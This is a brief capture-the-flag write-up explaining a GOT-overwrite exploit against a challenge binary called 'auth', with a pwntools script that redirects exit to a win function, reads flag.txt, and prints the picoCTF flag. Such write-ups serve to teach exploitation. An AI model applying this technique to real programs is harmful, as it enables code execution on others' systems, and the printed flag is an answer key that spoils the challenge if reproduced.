# 🔑 Write-Up

We have a trivial write-what-where, using that we can overwrite one of the GOT entries in order to get the program to call the function that we want, in this case `win`.


```python
from pwn import *

context.binary = "./auth"
p = process()

p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

### 🚩 Flag

```plain
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_7a9e7634}
```